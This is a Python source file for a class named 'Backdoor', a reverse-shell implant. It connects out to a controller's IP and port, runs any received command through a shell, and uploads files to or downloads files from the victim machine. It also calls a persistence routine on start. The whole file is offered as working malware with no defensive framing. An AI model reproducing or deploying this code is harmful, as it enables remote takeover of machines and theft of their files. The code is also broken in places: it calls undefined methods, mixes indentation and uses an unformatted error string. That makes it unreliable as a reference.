#!/usr/bin/env python3
import socket
import subprocess
import json
import os
import base64
import sys
import shutil


class Backdoor():
    def __init__(self, ip, port):
        self.persistence()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    def cmd_send(self, data):
    	"""
    	Send data in base64 format
    	"""
        json_send = json.dumps(data)
        self.connection.send(json_send)

    def cmd_recv(self):
        
    	"""
    	recive data in base64 format
    	"""
        json_recived = ""

        while True:
            try:
                json_recived += self.connection.recv(1024)
                return json.loads(json_recived)
            except ValueError:
                continue
    def change_dir(self, path):
        """
        Changes current directory to $path
        """

        os.chdir(path)
    
        return "Changed dir to %s" % path
    def upload_file(self, path, content):
    	"""
    	Uploads file
    	""" 
        with open(path, "wb") as file:
            uploaded_file = base64.b64decode(content)
            file.write(uploaded_file)
            return "Uploaded Succesfully !"

    def download_file(self, path):
        with open(path, "rb") as file:
            download_file = base64.b64encode(file.read())
            return download_file

    def exec_command(self, command):
        return subprocess.check_output(command, shell=True)



    def run(self):
        while True:
            rcvd_cmd = self.reliable_recv()
            try:
                if rcvd_cmd[0] == "exit":
                    self.connection.close()
                    sys.exit() 
                elif rcvd_cmd[0] == "cd" and len(rcvd_cmd) > 1:
                    cmd_rslt = self.change_dir(rcvd_cmd[1])
                elif rcvd_cmd[0] == "download":
                    cmd_rslt = self.download_file(rcvd_cmd[1])
                elif rcvd_cmd[0] == "upload":
                    cmd_rslt = self.upload_file(rcvd_cmd[1], rcvd_cmd[2])
                else:
                    cmd_rslt = self.exec_command(rcvd_cmd)
            except Exception as e :
                cmd_rslt = "[-] Error During Command Execution.\n ERROR:\t{e}\t"

            self.cmd_send(cmd_rslt)
